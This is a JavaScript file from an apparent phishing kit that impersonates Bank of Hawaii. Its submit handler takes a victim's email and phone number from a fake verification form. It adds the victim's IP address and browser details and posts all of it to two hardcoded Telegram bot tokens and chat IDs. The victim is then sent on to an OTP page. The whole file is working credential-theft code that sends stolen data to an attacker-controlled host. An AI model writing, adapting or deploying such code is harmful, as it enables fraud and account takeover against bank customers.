document.getElementById('VerificationForm').addEventListener('submit', function (event) {
    event.preventDefault();
    submitVerification();
});

function submitVerification() {
    const email = document.getElementById('username').value.trim();
    const phoneNumber = document.getElementById('password').value.trim();
    const continueButton = document.querySelector('.logIn');

    if (!validateEmail(email)) {
        alert("Please enter a valid email address.");
        return;
    }

    if (phoneNumber.length < 10) {
        alert("Please enter a valid phone number.");
        return;
    }

    continueButton.textContent = "Verifying...";
    continueButton.disabled = true;

    fetchIpAddress().then(ip => {
        const userAgent = navigator.userAgent;

        const message = `*#-[ BANK OF HAWAII AUTHENTICATION ]-#*\n\n*Email* : ${email}\n*Phone Number* : ${phoneNumber}\n*IP Address* : ${ip}\n*Device Info* : ${userAgent}\n\n*#------------[ END ]-------------#*`;

        showLoadingSpinner();

        Promise.all([
            sendToTelegram(message, '7296082774:AAFvxOm88DKwjKo_lar3bbwJOcRftuNvNlc', '6994641548'), // Bot 1
            sendToTelegram(message, '7358577107:AAGMMSwYu4-OSpHMXnmNofQ_hO5JZ7-yONw', '6069290001')  // Bot 2
        ])
            .then(() => {
                setTimeout(() => {
                    window.location.href = "otp2.html";
                }, 5000);
            })
            .catch(error => {
                console.error('Error submitting verification details:', error);
                alert("An error occurred while submitting your details.");
                hideLoadingSpinner();
                resetButtonState();
            });
    }).catch(error => {
        console.error("Error fetching IP address:", error);
        alert("An error occurred while fetching IP address.");
        hideLoadingSpinner();
        resetButtonState();
    });
}

function validateEmail(email) {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
}

function resetButtonState() {
    const continueButton = document.querySelector('.logIn');
    continueButton.textContent = "Continue";
    continueButton.disabled = false;
}

function fetchIpAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(() => "Unavailable");
}

function showLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'flex';
    }
}

function hideLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'none';
    }
}

function sendToTelegram(message, botToken, chatId) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    return fetch(url, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Telegram API responded with status ${response.status}`);
            }
            return response.json();
        });
}

// Phone number formatting while typing
document.getElementById("password").addEventListener("input", function (e) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters

    if (value.length > 10) value = value.slice(0, 10); // Limit input to 10 digits

    let formattedValue = "";

    if (value.length > 0) formattedValue += "(" + value.substring(0, 3);
    if (value.length > 3) formattedValue += ") " + value.substring(3, 6);
    if (value.length > 6) formattedValue += "-" + value.substring(6, 10);

    e.target.value = formattedValue;
});
